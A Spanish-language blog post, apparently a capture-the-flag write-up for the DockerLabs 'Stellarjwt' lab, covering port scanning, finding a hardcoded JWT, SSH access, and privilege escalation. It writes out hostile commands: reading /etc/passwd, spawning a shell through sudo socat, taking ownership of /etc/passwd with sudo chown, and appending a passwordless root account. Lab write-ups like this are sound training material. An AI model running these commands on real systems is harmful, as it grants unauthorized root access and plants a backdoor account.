---
layout: post
title: "DockerLabs: Stellarjwt"
date: 2026-08-20 12:00:00 -0400
categories: dockerlabs
tags: [jwt, nmap, burpsuite, web-exploitation, privesc]
---

  **Stellarjwt** Es una maquina que requiere que aprendas JWT(JSON Web token). Como su nombre indica, es un token escrito en formato JSON, el cual por defecto casi siempre viene encodeado en base64, la estructura de este JSON es la siguiente: El Header, el Payload y el Signature. Cada parte del JWT es reconocible inclusive desde el encode de base64 porque empieza y termina con un punto.

  Usualmente las vulnerabilidades de JWT involucran inyectar, modificar o simplemente sacar informacion valiosa del Header o Payload, que puede contener usuarios, privilegios, roles, etc.  

---

## 1. nmap 

Por buena practica, inclusive si sabemos a donde apunta una maquina, es bueno escanear en busca de puertos abiertos, realizar un ping a la maquina y revisar que podamos revisarla bien luego con detenimiento.

```bash
# Escaneo de puertos abiertos
 $ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
# Escaneo profundo de versiones y scripts
 $ nmap -sC -sV -p22,80 172.17.0.2 -oN targeted
```

![nmap](/assets/img/stellarjwt/nmap1.png)

---

## 2. Hardcoded JWT

Ya sabemos que existe un puerto 80 con el servicio HTTP abierto, podriamos simplemente ir a explorar la pagina web, otra buena practica, cuanto lidiamos con paginas web, es enumerar los directorios que esta pueda tener.

```bash
 $ gobuster dir -u [http://172.17.0.2](http://172.17.0.2) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![dirbuster](/assets/img/stellarjwt/dirbuster.png)

Con los resultados del gobuster podemos ver que tienen una carpeta llamada /universe, recordemos revisar siempre el codigo fuente de una pagina web, nunca se puede descartar que existan secretos, passwords o en este caso, un JWT hardcodeado.

![pagina](/assets/img/stellarjwt/80.png)

![hardcode](/assets/img/stellarjwt/hardcoded.png)

---

## 3. Manipulación de JWT

*Burp Suite nos permite editar, modificar y alterar JWT de manera mucho mas comoda, uno simplemente podria ir a cualquier decodificador de base64 y observar los contenidos del JWT, pero como burp suite tiene un decoder de forma nativa, prefiero hacerlo con este metodo*

![Burpsuite](/assets/img/stellarjwt/decrypt.png)

Una vez observados los contenidos del JWT, vemos que existe un usuario llamado Neptuno, el siguiente paso del lab me tomo mucho tiempo (porque soy perdido). Pero si atamos los cabos con la pregunta de la pagina principal, con el usuario que tenemos aqui, tenemos todo lo que necesitamos para entrar al sistema.

```bash
$ ssh neptuno@172.17.0.2
```

![Conexion](/assets/img/stellarjwt/ssh.png)

Con la info de la contraseña de ssh, logramos acceder como usuario neptuno, el siguiente paso seria hacer pivoting y escalado de privilegios.

---

## 4. Pivoting y Privilege Escalation 

Ya como el usuario neptuno, tenemos varias formas de enumerar el sitio en el que estamos ubicados, el primero es el clasico cat al /etc/passwd. El otro metodo es simplemente revisar la carpeta /home. 

```bash
 $ cat etc/passwd
```

![/etc/passwd](/assets/img/stellarjwt/enumerate_passwd.png)

```bash
 $ cd /home
 $ ls
```

![home](/assets/img/stellarjwt/home.png)

Ya que tenemos listados los usuarios de este dispositivo los siguientes pasos podrian variar dependiendo del sistema. Primero, revisar si tenemos acceso a otras carpetas de otros usuarios, segundo, validar la carpeta del usuario en la que nos encontramos actualmente.

*revisando el directorio de neptuno, vemos una carta un poco rara, a principio no entendi porque estaba ahi, pero hay un detalle, igual que con la contraseña pasada, que necesitamos extraer de aqui*

![passwd](/assets/img/stellarjwt/cartaNasa.png)

---

*Hemos logrado pivotear de un usuario a otro, simplemente haciendo el comando su para cambiar de user:*

```bash
 $ su nasa
```

![nasa](/assets/img/stellarjwt/gottfried.png)

realizamos el mismo proceso de enumeracion una vez hemos cambiado de usuario. Solo que esta vez, añadiremos un paso mas: revisar si este usuario tiene privilegios de sudoers.

```bash
 $ sudo -l
```

![socat](/assets/img/stellarjwt/socat.png)

Nos damos cuenta que podemos ejecutar el comando socat con privilegios de root desde el usuario elite.


```bash
# como podemos usar socat desde elite, usamos este comando para obtener acceso a elite como usuario
 $ sudo -u elite /usr/bin/socat - exec:/bin/sh,pty,ctty,raw,echo=0
# luego si gustan y no les gusta el prompt basico con un $ pueden usar un
 $ bash -i
```

![elite](/assets/img/stellarjwt/elite.png)

Siempre es buena practica verificar que usuario obtuvimos, ya estamos en el ultimo paso para obtener root

```bash
$ whoami
```
![chown](/assets/img/stellarjwt/chown.png)

*El mismo proceso debe realizarse con cada usuario que tengamos acceso, en este caso, el usuario elite, tiene privilegios para ejecutar change owner (chown) para ganar acesso sin restricciones a /etc/passwd*

```bash
$ sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd
```

Con este comando, logramos ejecutar chown para ganar total control sobre /etc/passwd, la idea que me parecio mas graciosa a este punto, es inyectarle un usuario nuevo con acesso a root sin contraseña, ya que tenemos completo acceso de escritura en esta ruta, hare el ejemplo con mi nombre.

```bash
$ echo 'saul::0:0:hacker:/root:/bin/bash' >> /etc/passwd
```
![root](/assets/img/stellarjwt/root.png)

*A este punto ya saben que hacer perfectamente bien, ya somos root, a manera de quiz, la maquina tiene un script que seria bueno que revisen y respondan honestamente*

Ojala les haya servido.
---

## JSON Web Tokens. 

Si bien esta maquina no profundiza mucho en lo que se puede explotar teniendo un web token vulnerable, es un buen punto de partida para empezar a aprender este tipo de vulnerabilidades, en el futuro planeo subir otros writeup en entornos de PortSwigger donde se profundiza un poco mas sobre el uso de herramientas como Burp Suite para editar un JWT.